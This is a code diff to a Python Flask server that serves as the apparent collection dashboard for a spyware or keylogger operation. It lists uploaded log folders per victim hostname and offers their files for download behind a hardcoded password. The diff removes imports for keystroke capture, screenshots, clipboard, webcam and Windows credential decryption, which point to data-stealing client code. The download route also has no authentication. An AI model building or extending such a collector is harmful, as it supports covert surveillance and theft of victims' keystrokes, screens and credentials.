@@ -1,22 +1,8 @@
 import os
-import platform
-import getpass
-import socket
-import psutil
-import pyautogui
-import time
-import requests
-from pynput import keyboard
-from datetime import datetime
-import pyperclip
-import sqlite3
-from shutil import copyfile
-from watchdog.observers import Observer
-from watchdog.events import FileSystemEventHandler
-import threading, subprocess, glob, re, cv2, win32crypt
-import pytz
 from flask import Flask, request, send_from_directory, render_template_string
 from werkzeug.utils import secure_filename
+from datetime import datetime
+import pytz
 
 UPLOAD_ROOT = "logs"
 PASSWORD = "disha456"
@@ -54,7 +40,7 @@ HTML_TEMPLATE = '''
       <button type="submit">Login</button>
     </form>
   {% else %}
-    <h2>Log Viewer (Live Feed)</h2>
+    <center><h2>Log Viewer (Live Feed)</h2></center>
     <table>
       <tr>
         {% for col in columns %}
@@ -66,14 +52,14 @@ HTML_TEMPLATE = '''
           <td>{{ folder.hostname }}</td>
           <td>{{ folder.timestamp }}</td>
           {% for file in folder.files %}
-            <td>{% if file %}<a href="{{ file }}">📥 Download{% else %}-{% endif %}</td>
+            <td>{% if file %}<a href="{{ file }}">📥 View/Download</a>{% else %}-{% endif %}</td>
           {% endfor %}
         </tr>
       {% endfor %}
     </table>
   {% endif %}
 </body>
-</html>d
+</html>
 '''
 
 @app.route("/", methods=["GET", "POST"])
@@ -90,29 +76,43 @@ def index():
         for folder in sorted(os.listdir(UPLOAD_ROOT), reverse=True):
             full_path = os.path.join(UPLOAD_ROOT, folder)
             if os.path.isdir(full_path):
-                row = {"hostname": folder.split("_")[0], "timestamp": folder.split("_")[1], "files": []}
-
-                # Format timestamp in IST
+                # Convert folder name timestamp to IST format
                 try:
                     dt = datetime.strptime(folder, "%Y-%m-%d_%H-%M-%S")
-                    utc = pytz.utc
-                    dt_utc = utc.localize(dt)
-                    ist = pytz.timezone('Asia/Kolkata')
-                    dt_ist = dt_utc.astimezone(ist)
-                    row["timestamp"] = dt_ist.strftime("%H:%M:%S__%d:%m:%Y")
+                    utc = pytz.utc.localize(dt)
+                    ist = utc.astimezone(pytz.timezone('Asia/Kolkata'))
+                    formatted_timestamp = ist.strftime("%H:%M:%S__%d:%m:%Y")
                 except:
-                    pass
+                    formatted_timestamp = folder
+
+                row = {"hostname": "", "timestamp": formatted_timestamp, "files": []}
 
                 for col in COLUMNS[2:]:
-                    match_file = next((f for f in os.listdir(full_path) if col.lower().replace(" ", "_") in f.lower()), None)
-                    if match_file:
-                        if "host" in match_file.lower():
-                            with open(os.path.join(full_path, match_file), "r", encoding="utf-8") as f:
-                                row["hostname"] = f.read().strip().split("\n")[0]
-                        else:
-                            row["files"].append(f"/download/{folder}/{match_file}")
-                    else:
+                    matched = False
+                    for f in os.listdir(full_path):
+                        normalized = col.lower().replace(" ", "_")
+                        if normalized in f.lower():
+                            file_path = os.path.join(full_path, f)
+                            row["files"].append(f"/download/{folder}/{f}")
+                            matched = True
+                            break
+                    if not matched:
                         row["files"].append(None)
+
+                # Extract hostname from activity_log.txt
+                activity_log_file = next((f for f in os.listdir(full_path) if "activity_log" in f.lower()), None)
+                if activity_log_file:
+                    try:
+                        with open(os.path.join(full_path, activity_log_file), "r", encoding="utf-8") as f:
+                            for line in f:
+                                if "Computer Name:" in line:
+                                    row["hostname"] = line.split(":", 1)[1].strip()
+                                    break
+                    except:
+                        row["hostname"] = "Unknown"
+
+                if not row["hostname"]:
+                    row["hostname"] = folder.split("_")[0]
                 log_entries.append(row)
 
     return render_template_string(HTML_TEMPLATE, authed=authed, columns=COLUMNS, logs=log_entries)
@@ -130,6 +130,3 @@ def receive():
 @app.route("/download/<folder>/<filename>")
 def download(folder, filename):
     return send_from_directory(os.path.join(UPLOAD_ROOT, folder), filename)
-
-if __name__ == "__main__":
-    app.run(debug=True)
